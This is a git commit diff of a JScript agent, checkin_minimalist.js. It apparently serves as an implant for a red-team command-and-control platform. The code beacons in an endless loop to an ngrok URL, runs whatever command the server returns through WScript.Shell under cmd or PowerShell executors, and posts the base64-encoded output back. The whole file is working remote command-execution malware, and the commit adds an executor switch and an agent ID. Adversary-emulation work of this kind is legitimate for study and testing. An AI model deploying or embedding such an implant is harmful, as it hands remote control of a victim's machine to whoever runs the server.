e28c7fbced90bf7f53efe44a1ffe217e919aa94e
secdev-01 <83469949+secdev-01@users.noreply.github.com>
2021-06-27 06:52:16 -0600

    Update checkin_minimalist.js
    added switch for executor
    added GUID generator
    refactored some other elements to make it cleaner

--- jscript/checkin_minimalist.js
+++ jscript/checkin_minimalist.js
@@ -1,13 +1,40 @@
 // cscript.exe checkin_minimalist.js
 
+// Create Unique ID
+
+/*
+
+If you wanted to create a unique GUID Each run.
+
+
+var TypeLib = new ActiveXObject("Scriptlet.TypeLib");
+var guid = (TypeLib.Guid).replace('{', '').replace('}', '');
+var myGuid = guid.substring(1,guid.length-2);
+WScript.Echo(myGuid);
+
+
+WScript.StdIn.ReadLine();
+
+*/
+var myGuid = "4D44BF0-C0D0-4D21-9694-8C8BB885B6E3";
+
+//TODO: Add Range variable, etc...
 
 // Create Base64 Object, supports encode, decode 
 	var Base64={characters:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){Base64.characters;var r="",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};
 // We'll base64 endode /decode stdout to stay sane. :)
 
 var prelude_operator_server = 'https://boomtown.ngrok.io';
-var JSONCheckin =  '{"Name":"BoomerJS_Simple","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
+var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
 
+function sleep_for(count)  // TODO Align with JSON Sleep:
+{
+	for (i=1; i<=count; i++)
+	{
+		WScript.Sleep(1000)
+		WScript.Echo("I started",i,"second(s) ago.")
+	}
+}
 
 function postText(strURL, json_data)
 {
@@ -54,6 +81,7 @@ function parse_Execute(task)
 	var c = "";
 	var id_task = "";
 	var operation = "";
+	var executor = "";
 	
 	for (var i = 0; i < jsonData.links.length; i++) {
 		var counter = jsonData.links[i];
@@ -62,14 +90,43 @@ function parse_Execute(task)
 		c = counter.Request;
 		id_task = counter.ID;
 		operation = counter.operation;
+		executor = counter.Executor;
 	}
 	
-	r = new ActiveXObject("WScript.Shell").Exec(c);
-	var so;
+	/* debug output
+	WScript.StdOut.WriteLine(executor);
+	WScript.StdIn.ReadLine();
+	*/
 	
-	while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
-	var so_b64 = Base64.encode(so); //base64 encode stdout.
-	var JSONResponse = '{"Name":"BoomerJS_Simple","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh", "cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+	// Setup Execution Env;
+	
+	var JSONResponse = "";
+	var so = ""; //Collect STDOUT;
+	var so_b64 = ""; //Base64 Encoded STDOUT;
+	
+	
+	switch(executor)
+	{
+		case "cmd":
+			var r = new ActiveXObject("WScript.Shell").Exec(c);
+			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
+			so_b64 = Base64.encode(so); //base64 encode stdout.
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			break;
+			
+		case "psh":
+			var r = new ActiveXObject("WScript.Shell").Exec(c);
+			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
+			so_b64 = Base64.encode(so); //base64 encode stdout.
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			break;
+		
+			
+	}
+	/* debugger
+	WScript.StdOut.WriteLine(JSONResponse);
+	WScript.StdIn.ReadLine();
+	*/
 	
 	postText(prelude_operator_server, JSONResponse);
 }
@@ -81,55 +138,26 @@ while(true)
 		var checkin_Response = postText(prelude_operator_server, JSONCheckin);
 
 		if(checkin_Response.length < 1) {
-			WScript.Echo("Nothing to See Here");	
-			for (i=1; i<=10; i++)
-			{
-				WScript.Sleep(1000)
-				WScript.Echo("I started",i,"second(s) ago.")
-			}
-		continue;
+			WScript.Echo("Nothing to See Here");
+			sleep_for(10);
 			
 		}
 		else {
+			
 			parse_Execute(checkin_Response);
+			sleep_for(10);
+			
+			
 		}
-
+		continue;
 
 }
-
-/* Proxy Required
-
-// HttpRequest SetCredentials flags.
-HTTPREQUEST_PROXYSETTING_DEFAULT   = 0;
-HTTPREQUEST_PROXYSETTING_PRECONFIG = 0;
-HTTPREQUEST_PROXYSETTING_DIRECT    = 1;
-HTTPREQUEST_PROXYSETTING_PROXY     = 2;
-
-// Instantiate a WinHttpRequest object.
-var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-
-// Use proxy_server for all requests outside of 
-// the microsoft.com domain.
-WinHttpReq.SetProxy( HTTPREQUEST_PROXYSETTING_PROXY, 
-                     "proxy_server:80", 
-                     "*.microsoft.com");
-
-// Initialize an HTTP request.  
-WinHttpReq.Open("GET", "https://www.microsoft.com", false);
-
-// Send the HTTP request.
-WinHttpReq.Send(); 
-
-// Display the response text.
-WScript.Echo( WinHttpReq.ResponseText);
-
-*/
 
 
 /*
 References:
 
-
+Example if your agent is behind a proxy.
 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-setproxy#examples
 https://docs.microsoft.com/en-us/windows/win32/winhttp/iwinhttprequest-send
 
